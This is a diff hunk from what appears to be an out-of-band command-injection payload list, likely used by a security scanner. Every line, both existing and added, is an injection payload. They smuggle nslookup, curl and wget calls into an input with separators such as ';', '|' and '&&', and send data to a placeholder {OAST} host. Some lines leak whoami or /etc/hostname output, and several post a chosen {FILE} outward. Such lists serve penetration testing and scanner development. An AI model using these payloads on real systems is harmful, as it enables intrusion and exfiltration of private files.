@@ -15,3 +15,13 @@ $(nslookup {OAST})
 ||nslookup $(whoami).{OAST}||
 ||nslookup $(cat /etc/hostname).{OAST}||
 ||curl `whoami`.{OAST}||
+1;nslookup {OAST} #
+1|nslookup {OAST} #
+1||nslookup {OAST} #
+1&nslookup {OAST} #
+1&&nslookup {OAST} #
+1|curl {OAST} #
+1|curl http://{OAST} #
+1|curl --data @{FILE} {OAST} #
+1|curl --data @{FILE} http://{OAST} #
+1|wget --post-file {FILE} http://{OAST} #
